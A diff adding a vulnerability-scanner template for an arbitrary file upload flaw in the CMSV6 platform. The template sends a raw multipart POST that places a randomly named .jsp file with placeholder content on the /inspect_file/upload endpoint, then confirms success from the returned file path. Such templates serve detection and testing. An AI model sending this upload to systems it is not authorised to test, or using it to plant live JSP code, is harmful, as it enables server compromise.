@@ -1,0 +1,45 @@
+id: cmsv6-inspect-file-upload-debug
+
+info:
+  name: 通天星-CMSV6-inspect_file-upload存在任意文件上传漏洞 (Debug)
+  author: ChiragArtani
+  severity: critical
+  tags: fileupload,cmsv6,debug
+
+variables:
+  randstr: "{{rand_text_alpha(6)}}"
+  randbody: "{{base64_decode('YXNkYWFzZGFzZA==')}}"
+  rboundary: "{{rand_text_alpha(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /inspect_file/upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+        
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="uploadFile"; filename="{{randstr}}.jsp"
+        Content-Type: application/octet-stream
+        
+        {{randbody}}
+        ------WebKitFormBoundary{{rboundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      
+      - type: word
+        part: body
+        words:
+          - '"result":0'
+          - '"filePath":'
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '.*'
